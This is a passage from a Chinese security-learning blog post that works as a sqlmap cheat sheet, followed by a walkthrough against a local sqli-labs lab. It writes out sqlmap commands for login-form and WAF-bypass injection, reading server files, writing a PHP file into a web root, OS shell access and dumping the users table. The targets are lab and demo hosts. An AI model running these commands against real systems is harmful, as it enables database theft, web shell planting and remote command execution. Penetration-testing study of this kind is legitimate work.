+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-</span><br><span class="line">type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure>
+<h2 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h2><p>参数：–common-tables<br>当使用–tables无法获取到数据库的表时，可以使用此参数。<br>通常是如下情况：<br>1、MySQL数据库版本小于5.0，没有information_schema表。<br>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。<br>3、当前用户没有权限读取系统中保存数据结构的表的权限。<br>暴力破解的表在txt&#x2F;common-tables.txt文件中，你可以自己添加。</p>
+<p>Xx  –common-tables -D testdb</p>
+<h2 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h2><p>参数：–common-columns<br>与暴力破解表名一样，暴力跑的列名在txt&#x2F;common-columns.txt中。</p>
+<p>Xx  –common-columns  -T text -D testdb</p>
+<h2 id="POST登录框注入"><a href="#POST登录框注入" class="headerlink" title="POST登录框注入"></a>POST登录框注入</h2><p>注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://testasp.vulnweb.com/Login.asp</span><br></pre></td></tr></table></figure>
+<p>几种注入方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py -r search-test.txt -p tfUPass </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r search-test.txt</span><br></pre></td></tr></table></figure>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p>注入点：<a target="_blank" rel="noopener external nofollow noreferrer" href="http://xxx.com/index.php/Index/view/id/40.html">http://xxx.com/index.php/Index/view/id/40.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxx.com/index.php/Index/view/id/40*.htm</span><br></pre></td></tr></table></figure>
+
+<h2 id="base64编码注入"><a href="#base64编码注入" class="headerlink" title="base64编码注入"></a>base64编码注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxx.com --tamper base64encode.py –dbs</span><br></pre></td></tr></table></figure>
+<h2 id="请求时间延迟"><a href="#请求时间延迟" class="headerlink" title="请求时间延迟"></a>请求时间延迟</h2><p>参数：–time-sec<br>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒</p>
+<h2 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h2><p>–sql-query&#x3D;”select @@version”<br>–sql-shell</p>
+<p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。<br>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
+<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>从数据库服务器中读取文件<br>参数：–file-read<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;C:\Inetpub\wwwroot\mysql-php\1.php&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>参数：–file-write,–file-dest<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>参数：–os-cmd,–os-shell<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br>cmd			执行cmd命令（win）<br>shell			执行当前用户命令<br>–os-shell<br>自动上传 脚本文件<br>返回shell</p>
+<h2 id="WAF绕过注入"><a href="#WAF绕过注入" class="headerlink" title="WAF绕过注入"></a>WAF绕过注入</h2><p>注入点:<code>http://192.168.159.1/news.php?id=1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs  --batch --tamper &quot;space2morehash.py&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">space2hash.py   base64encode.py charencode.py</span><br></pre></td></tr></table></figure>
+<h2 id="并不是都要记住-更多是方便做自己来查找"><a href="#并不是都要记住-更多是方便做自己来查找" class="headerlink" title="并不是都要记住,更多是方便做自己来查找"></a>并不是都要记住,更多是方便做自己来查找</h2><h1 id="sqlmap尝试sqli-labs-less-1"><a href="#sqlmap尝试sqli-labs-less-1" class="headerlink" title="sqlmap尝试sqli-labs less-1"></a>sqlmap尝试sqli-labs less-1</h1><ul>
+<li><p>个人靶场地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.130:86/</span><br></pre></td></tr></table></figure></li>
+<li><p>sqli-labs 的  数据库是<code>security</code></p>
+</li>
+<li><p>sqlmap用的是kali里的</p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
+<li><p>扫描数据库 （注意链接加?id&#x3D;1）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>查看数据表 (选择security数据库 查表)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security --tables</span><br></pre></td></tr></table></figure></li>
+<li><p>查看列字段 （选择security数据库 选择users表 查字段）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security -T users --clounms</span><br></pre></td></tr></table></figure></li>
+<li><p>查看列字段的具体值  （选择security数据库 选择user表 选择id.username.password并输出（dump））</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.169.130:86/Less-1/?id=1 -D security -T users --columns id.username.password -dump</span><br></pre></td></tr></table></figure></li>
+<li><p>结束</p>
+</li>
+</ul>
+<h1 id="一些扩展"><a href="#一些扩展" class="headerlink" title="一些扩展"></a>一些扩展</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><img src="/img/sqlmap-d52c7840.jpg">
+
+<ul>
+<li>图转见水印</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/archives/e5da2ca1.html">http://example.com/archives/e5da2ca1.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Putdownd--Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a></div><div class="post_share"><div class="social-share" data-image="/img/e5925563a436d850cfc6184421b9ec77.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/71f4c5ab.html"><img class="prev-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">metasploit</div></div></a></div><div class="next-post pull-right"><a href="/archives/46a16768.html"><img class="next-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">burpsuite+火狐</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/a73cee8b.html" title="Burp Suite 安装"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-22</div><div class="title">Burp Suite 安装</div></div></a></div><div><a href="/archives/46a16768.html" title="burpsuite+火狐"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-27</div><div class="title">burpsuite+火狐</div></div></a></div><div><a href="/archives/71f4c5ab.html" title="metasploit"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-28</div><div class="title">metasploit</div></div></a></div><div><a href="/archives/96512c85.html" title="nmap"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-28</div><div class="title">nmap</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMAP%E4%BB%8B%E7%BB%8D"><span class="toc-text">SQLMAP介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E5%AE%89%E8%A3%85"><span class="toc-text">sqlmap安装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-text">参数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0"><span class="toc-text">基本参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AD%89%E7%BA%A7"><span class="toc-text">探测等级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E8%B0%83%E8%AF%95%E4%BF%A1%E6%81%AF"><span class="toc-text">显示调试信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7"><span class="toc-text">风险等级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87"><span class="toc-text">获取目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E6%89%AB%E6%8F%8F"><span class="toc-text">从文本中获取多个目标扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96http%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%85%A5"><span class="toc-text">获取http请求注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96http%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%85%A5-1"><span class="toc-text">获取http请求注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%84%E7%90%86Google%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C"><span class="toc-text">处理Google搜索结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93data"><span class="toc-text">–data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93param-del"><span class="toc-text">–param-del</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93cookie"><span class="toc-text">–cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93referer-%E2%80%93headers-%E2%80%93proxy"><span class="toc-text">–referer,–headers,–proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%8E%A7%E5%88%B6"><span class="toc-text">时间控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93safe-url-%E2%80%93safe-freq"><span class="toc-text">–safe-url,–safe-freq</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#p"><span class="toc-text">-p</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93prefix-%E2%80%93suffix"><span class="toc-text">–prefix,–suffix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93technique"><span class="toc-text">–technique</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93union-cols"><span class="toc-text">–union-cols</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93second-order"><span class="toc-text">–second-order</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93dump-all-%E2%80%93exclude-sysdbs"><span class="toc-text">–dump-all,–exclude-sysdbs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93dump-all-%E2%80%93exclude-sysdbs-1"><span class="toc-text">–dump-all,–exclude-sysdbs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93search-C-T-D"><span class="toc-text">–search,-C,-T,-D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93udf-inject-%E2%80%93shared-lib"><span class="toc-text">–udf-inject,–shared-lib</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s-t"><span class="toc-text">-s,-t</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93batch"><span class="toc-text">–batch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93flush-session"><span class="toc-text">–flush-session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93output-dir"><span class="toc-text">–output-dir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93smart-%E2%80%93mobile"><span class="toc-text">–smart,–mobile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%93identify-waf-%E2%80%93check-waf"><span class="toc-text">–identify-waf,–check-waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C"><span class="toc-text">注册表操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="toc-text">暴力破解表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%88%97%E5%90%8D"><span class="toc-text">暴力破解列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST%E7%99%BB%E5%BD%95%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="toc-text">POST登录框注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="toc-text">搜索框注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-text">伪静态注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">base64编码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F"><span class="toc-text">请求时间延迟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Csql%E8%AF%AD%E5%8F%A5"><span class="toc-text">执行sql语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-text">文件读写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-text">WAF绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B6%E4%B8%8D%E6%98%AF%E9%83%BD%E8%A6%81%E8%AE%B0%E4%BD%8F-%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%96%B9%E4%BE%BF%E5%81%9A%E8%87%AA%E5%B7%B1%E6%9D%A5%E6%9F%A5%E6%89%BE"><span class="toc-text">并不是都要记住,更多是方便做自己来查找</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E5%B0%9D%E8%AF%95sqli-labs-less-1"><span class="toc-text">sqlmap尝试sqli-labs less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-text">开始</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%89%A9%E5%B1%95"><span class="toc-text">一些扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-text">思维导图</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By putdown</div><div class="footer_custom_text"><div> Welcome to lie down </div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
